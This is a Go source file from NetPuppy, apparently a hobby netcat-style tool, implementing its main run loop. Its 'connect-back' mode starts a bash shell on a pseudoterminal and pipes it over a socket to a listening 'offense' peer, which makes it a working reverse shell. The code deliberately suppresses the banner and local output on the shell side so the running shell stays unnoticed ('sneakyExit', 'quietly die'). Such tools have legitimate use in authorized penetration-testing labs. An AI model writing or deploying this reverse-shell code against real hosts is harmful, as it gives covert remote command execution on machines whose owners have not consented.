package cmd

import (
	"errors"
	"fmt"
	"io"
	"os"
	"os/signal"
	"syscall"
	"time"

	// NetPuppy pkgs:
	"github.com/trshpuppy/netpuppy/cmd/conn"
	"github.com/trshpuppy/netpuppy/cmd/shell"
	"github.com/trshpuppy/netpuppy/pkg/ioctl"
	"github.com/trshpuppy/netpuppy/pkg/pty"
	"github.com/trshpuppy/netpuppy/utils"
	"golang.org/x/sys/unix"
)

// WRITECOOTER STAYS!!!!! TO COMMEMORATE THE DUMBEST BUG I'VE EVER PERSONALLY ENCOUNTERED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
type WriteCooter struct {
	Writer io.Writer
	Count  uint64
}

func (wc *WriteCooter) Write(dataInPipe []byte) (int, error) {
	bytesSent, err := wc.Writer.Write(dataInPipe)
	wc.Count += uint64(bytesSent)

	return bytesSent, err
}

type ReadCounter struct {
	Reader io.Reader
	Count  uint64
}

func (rc *ReadCounter) Read(dataInPipe []byte) (int, error) {
	bytesRead, err := rc.Reader.Read(dataInPipe)
	rc.Count += uint64(bytesRead)

	return bytesRead, err
}

// This struct is being used in sneakyExit() (when there is a rev shell)
// .... so we can close things (since os.Exit() doesn't run defer statements)
type Closers struct {
	socketToClose conn.SocketInterface
	shellToClose  *shell.RealShell
	filesToClose  []*os.File
}

func Run(c conn.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()
	var closeUs Closers

	// Create peer instance based on user input:
	var thisPeer *conn.Peer = conn.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Print banner, but don't print if we are the peer running the shell (ooh sneaky!):
	if !thisPeer.Shell {
		fmt.Printf("%s", utils.Banner())

		// Update user:
		var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
		fmt.Println(updateUserBanner)
	}

	// Enable Raw Mode:
	oGTermios, err := ioctl.EnableRawMode(syscall.Stdin)
	if err != 0 {
		fmt.Printf("Error enabling raw mode: %v\n", err)
		os.Exit(1)
	}
	// Use the oGTermios structure w/ a defer of DisableRawMode() to reset the terminal before exiting:
	defer ioctl.DisableRawMode(syscall.Stdin, oGTermios)

	// Make connection:
	var socketInterface conn.SocketInterface
	if thisPeer.ConnectionType == "offense" {
		socketInterface = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
	} else {
		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
	}
	closeUs.socketToClose = socketInterface
	defer socketInterface.Close()

	// If shell flag is true, get shell cmd (to start later)
	var shellInterface *shell.RealShell
	var shellErr error

	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter shell.RealShellGetter
		shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()

		if shellErr != nil {
			errString := "Error starting shell: " + shellErr.Error()
			socketInterface.WriteShit([]byte(errString))
			socketInterface.Close()
			os.Exit(1)
		}
	}

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(socketInterface, thisPeer)

	// ................................................. CONNECT-BACK w/ SHELL .................................................

	// If we are the connect-back peer & the user wants a shell, start the shell here:
	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		// First, make a function we can call which sends errors into the socket
		// .... & handles closing files, etc. before quitting (sneaky).
		sneakyExit := func(err error, closeUs Closers) {
			// We are the rev-shell, let's limit output to stdout/err,
			// .... so send error through socket, then quit:
			socketPresent := closeUs.socketToClose != nil
			shellPresent := closeUs.shellToClose != nil
			filesPresent := len(closeUs.filesToClose) > 0

			errMsg := err.Error()

			// Send error, then close socket:
			if socketPresent {
				// We could maybe send a custom signal to tell the other peer to close immediately...
				// .... [[instead of it continuing to try to use the socket]]
				socketInterface.WriteShit([]byte(errMsg))
				closeUs.socketToClose.Close()
			}

			// Kill the rev-shell process:
			if shellPresent {
				shellInterface.Shell.Process.Release()
				shellInterface.Shell.Process.Kill()
			}

			// If there are open files (in the list), close them:
			if filesPresent {
				for _, file := range closeUs.filesToClose {
					fmt.Printf("Closing %v\n", file.Name())
					file.Close()
				}
			}

			// K, now we can quietly die
			os.Exit(69)
		}

		// Get pts and ptm device files (for pseudoterminal):
		master, pts, err := pty.GetPseudoterminalDevices()
		if err != nil {
			customErr := fmt.Errorf("Error starting shell: %v\n", err)
			sneakyExit(customErr, closeUs)
		}
		closeUs.filesToClose = append(closeUs.filesToClose, master, pts)
		defer master.Close()
		defer pts.Close()

		// Hook up slave/pts device to bash process:
		// .... (literally just point it to the file descriptors)
		shellInterface.Shell.Stdin = pts
		shellInterface.Shell.Stdout = pts
		shellInterface.Shell.Stderr = pts

		// Start bash:
		err = shellInterface.StartShell()
		if err != nil {
			// Write error to socket, close socket, quit:
			customErr := fmt.Errorf("Error starting shell: %v\n", err)
			sneakyExit(customErr, closeUs)
		}
		closeUs.shellToClose = shellInterface
		defer shellInterface.Shell.Process.Release()
		defer shellInterface.Shell.Process.Kill()

		var routineErr error

		// Copy output from master device to socket:
		go func(socket conn.SocketInterface, master *os.File) {

			//....................... BYTE BY BYTE
			// .....................
			// for {
			// 	// Make 1 byte buffer
			// 	buf := make([]byte, 1)

			// 	// Read 1 byte from master file into buffer
			// 	_, err = master.Read(buf)
			// 	if err != nil {
			// 		routineErr = fmt.Errorf("Error reading byte from master file: %v\n", err)
			// 		sneakyExit(routineErr, closeUs)
			// 		break
			// 	}

			// 	// Write buffer into socket
			// 	_, err = socket.WriteShit(buf)
			// 	if err != nil {
			// 		routineErr = fmt.Errorf("Error writing buffer from master to socket: %v\n", err)
			// 		sneakyExit(routineErr, closeUs)
			// 		break
			// 	}
			// }
			// .....................
			// ..................... BYTE BY BYTE END

			// Create instance of WriteCounter for io.Copy (dest arg):
			copyCounter := &WriteCooter{Writer: socket.GetWriter()}
			_, err := io.Copy(copyCounter, master)
			if err != nil {
				routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
				sneakyExit(routineErr, closeUs)
				return
			}
		}(socketInterface, master)

		// Copy output from socket to master device:
		go func(socket conn.SocketInterface, master *os.File) {
			// Use Read method on socket to read into a buffer of 1024, and get the indexed content:
			for {
				socketContent, puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die := socket.Read() // @arthvadrr 'err'
				if puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die != nil {
					routineErr = fmt.Errorf("ERROR: reading from socket: %v\n", puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die)
					sneakyExit(routineErr, closeUs)
					return
				}

				master.Write(socketContent)
			}
		}(socketInterface, master)

		// Start for loop with timeout to keep things running smoothly:
		for {
			// If one of the go routine catches an error,
			// .... then send that error to sneakyExit()
			if routineErr != nil {
				// Send error through socket, then quit:
				sneakyExit(routineErr, closeUs)
				return
			} else {
				// Timeout:
				time.Sleep(3 * time.Millisecond)
				//continue
			}

		}
	} else {
		// ................................................. OFFENSIVE SERVER .................................................
		// ... (or connect-back peer w/o shell flag)

		// ................................................. OG STRAT .................................................
		// ............................ This is for the listener peer;
		//								We have 4 go routines, one for reading input from the user,
		//								one for reading the socket, one for writing to the socket,
		//								and one for printing socket output to the user.
		//
		//								There are 2 channels. We use a case select block to check
		//								the channels for data. One channel has user input, the other
		//								has socket data. If there is data in either, then we call either
		//								writeToSocket() or printToUser(). If there isn't data in either,
		//								we timeout for 69 (nice) milliseconds.
		//
		//								This strat seems to run more smoothly than the io.Copy() strat below
		//								(even though it was the opposite case for the connect back peer).
		// ...........................

		// Make channels for reaading from user & socket
		// .... & defer their close until Run() returns:
		uWu := make(chan []byte) // userInputChan
		socketDataChan := make(chan []byte)
		readSocketCloseSignalChan := make(chan bool)
		readUserInputCloseSignalChan := make(chan bool)

		// Call this so we can close channels in case of other error during
		// .... main for select loop:
		nonSneakyExit := func(err error) {
			// Might be over kill, but send signal to routines,
			// .... then close channels:
			readSocketCloseSignalChan <- true
			readUserInputCloseSignalChan <- true

			// Close all channels:
			close(readSocketCloseSignalChan)
			close(readUserInputCloseSignalChan)
			close(uWu)
			close(socketDataChan)

			// Close socket:
			socketInterface.Close()

			// Now exit:
			fmt.Printf("Error: %v\n", err)
			os.Exit(69)
		}

		// But still defer...
		defer func() {
			readSocketCloseSignalChan <- true
			readUserInputCloseSignalChan <- true

			nonSneakyExit(fmt.Errorf("Closing out of defer block\n"))
		}()

		// Go routine to read stdin byte by byte and send to uWu chan:
		readUserInput := func(uWu chan<- []byte) {
			// Change stdin fd to non-blocking:
			fd := os.Stdin.Fd()

			err := unix.SetNonblock(int(fd), true)
			if err != nil {
				customErr := fmt.Errorf("Error: unable to set non blocking: %v\n", err)
				nonSneakyExit(customErr)
			}

			buffer := make([]byte, 1)

			// Read Stdin in a for loop, byte by byte...
			for {
				i, TIT_BY_BOO := os.Stdin.Read(buffer)
				if TIT_BY_BOO != nil {
					// If there is nothing read from stdin, or the buffer is full, continue:
					if errors.Is(TIT_BY_BOO, syscall.EAGAIN) || errors.Is(TIT_BY_BOO, syscall.EWOULDBLOCK) {
						continue
					}

					// If the error is io.EOF, stdin has ended and we can break the for loop:
					if errors.Is(TIT_BY_BOO, io.EOF) {
						break
					}
				}

				// Send the char down the socket
				uWu <- buffer[:i]
			}
			return
		}

		// Go routine to read data from socket:
		readSocket := func(socketInterface conn.SocketInterface, c chan<- []byte, stopSignalChan <-chan bool) {
			// For loop starts & we try to read the socket,
			// .... if there is data, we put it in the dataReadFromSocket channel.
			// .... If there is an error, we check the error type
			// .... (to handle EOF since we don't care about EOF)
			for {
				select {
				case stopSignal := <-stopSignalChan:
					if stopSignal {
						return
					}
				default:
					dataReadFromSocket, err := socketInterface.Read()
					if len(dataReadFromSocket) > 0 {
						c <- dataReadFromSocket
					}

					if err != nil {
						if errors.Is(err, io.EOF) {
							continue
						} else {
							customErr := fmt.Errorf("Error reading data from socket: %v\n", err)
							nonSneakyExit(customErr)
							return
						}
					}
				}
			}
		}

		// Go routine to write to socket:
		writeToSocket := func(data []byte, socketInterface conn.SocketInterface) {
			// Called from the select block (user has entered input)
			// .... Check length so we can clear channel, but not send blank data:
			_, erR := socketInterface.WriteShit(data)
			if erR != nil {
				customErr := fmt.Errorf("Error writing user input buffer to socket: %v\n", erR)
				nonSneakyExit(customErr)
				return
			}
		}

		// Go routine to print data from socket to user:
		printToUser := func(data []byte) {
			// Called from the select block (data has come in from the socket)
			// .... Check the length:
			if len(data) > 0 {
				_, err := os.Stdout.Write(data)
				if err != nil {
					customErr := fmt.Errorf("Error printing data to user: %v\n", err)
					nonSneakyExit(customErr)
					return
				}
			}
		}

		// .......................... Read routines & channels ....................

		// Start go routines to read from socket and user:
		go readSocket(socketInterface, socketDataChan, readSocketCloseSignalChan)
		//		go readUserInput(userInputChan, readUserInputCloseSignalChan)

		go readUserInput(uWu)
		// .........................................................................

		// This for loop uses a select block to check the channels from the read routines,
		// .... if either channel has data in it, then we call the write routines
		// .... which write to the socket OR print to the user
		// .... otherwise, we timeout.
		for {
			select {
			case dataFromUser := <-uWu:
				fmt.Printf("received byte from uWu-chan: %b\n", dataFromUser)

				go writeToSocket(dataFromUser, socketInterface)
			case dataFromSocket := <-socketDataChan:
				go printToUser(dataFromSocket)
			default:
				// Timeout:
				time.Sleep(69 * time.Millisecond)
			}
		}
	}
}

func listenForSIGINT(connection conn.SocketInterface, thisPeer *conn.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			fmt.Printf("Signal: %v\n", sig)

			// Maybe have a check here to send the signal to the socket
			// .... rather than quit netpuppy (since the user could be trying)
			// .... to send a signal to the rev shell
			if sig.String() == "interrupt" {
				if !thisPeer.Shell {
					fmt.Printf("signal: %v\n", sig)
				}
				connection.Close()
				os.Exit(2)
			}
		}
	}()
}
